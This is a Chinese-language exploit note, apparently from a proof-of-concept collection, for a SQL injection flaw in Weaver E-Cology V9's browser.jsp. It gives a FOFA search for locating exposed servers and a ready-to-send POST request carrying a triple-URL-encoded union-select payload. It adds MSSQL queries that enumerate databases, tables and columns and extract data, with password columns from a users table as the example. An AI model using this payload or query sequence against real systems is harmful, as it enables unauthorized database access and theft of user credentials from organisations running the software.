# 泛微OA E-Cology V9 browser.jsp SQL注入漏洞
## 资产收集：
fofa：`app="泛微-协同商务系统"`  
![](./img/E-CologyV9_sql.png)
## POC
漏洞位置：  
POS请求:/mobile/%20/plugin/browser.jsp ，参数：keyword ，exp需要三次url编码，MSSQL数据库  
poc：a' union select 1,''+(SELECT @@VERSION)+'  
查询结果会在响应信息数据的show1字段显示  
```
POST /mobile/%20/plugin/browser.jsp HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=utf-8
Connection: close
Content-Length: 649

isDis=1&browserTypeId=269&keyword=%2525%2536%2531%2525%2532%2537%2525%2532%2530%2525%2537%2535%2525%2536%2565%2525%2536%2539%2525%2536%2566%2525%2536%2565%2525%2532%2530%2525%2537%2533%2525%2536%2535%2525%2536%2563%2525%2536%2535%2525%2536%2533%2525%2537%2534%2525%2532%2530%2525%2533%2531%2525%2532%2563%2525%2532%2537%2525%2532%2537%2525%2532%2562%2525%2532%2538%2525%2535%2533%2525%2534%2535%2525%2534%2563%2525%2534%2535%2525%2534%2533%2525%2535%2534%2525%2532%2530%2525%2534%2530%2525%2534%2530%2525%2535%2536%2525%2534%2535%2525%2535%2532%2525%2535%2533%2525%2534%2539%2525%2534%2566%2525%2534%2565%2525%2532%2539%2525%2532%2562%2525%2532%2537
```
![](./img/E-CologyV9_sql_poc.png)
## URL三次编码脚本
可使用[python脚本](file/urlEncode3.py)进行三次url编码，命令：`python3 urlEncode3.py`
## MSSQL数据库语法
- 获取用户数据库  
```sql
# 获取第一个用户数据库（mssql有4个自带的数据库，用户创建从5开始，所以是dbid>4）
select top 1 name from master..sysdatabases where dbid>4
select top 1 name from master..sysdatabases where dbid>4 and name<>'[数据库名]'
select top 1 name from master..sysdatabases where dbid>4 and name<>'[数据库名1]' and name<>'[数据库名2]'
以此类推可以获取全部用户数据库名
# 或者一次全部导出所有数据库名为xml字符串
select name from master..sysdatabases for xml path
```
- 获取表名  
```sql
# 获取第一张表
select top 1 name from sysobjects where xtype='u'
select top 1 name from sysobjects where xtype='u' and name<>'[表名]'
select top 1 name from sysobjects where xtype='u' and name<>'[表名1]' and name<>'[表名2]'
以此类推可以获取全部表名（u=表(用户定义类型)）
# 或者一次全部导出所有表名为xml字符串
id=1 and 1=(select name from master..sysobjects for xml path)
```
- 获取表的列名
```sql
# 获取第一列列名
select top 1 name from syscolumns where id=(select id from sysobjects where name='[表名]')
select top 1 name from syscolumns where id=(select id from sysobjects where name='[表名]') and name<>'[列名]'
以此类推
```
- 获取表数据
```sql
# 获取第一个用户名对应的密码
select top 1 [列名] from [表名]
select top 1 [列名] from [表名] where [列名]<>'[具体数据]'
以此类推
# 示例
select top 1 upass from users
select top 1 upass from users where upass<>'123456'
```
指路：https://houkc.github.io/2020/11/29/SQLInjection3/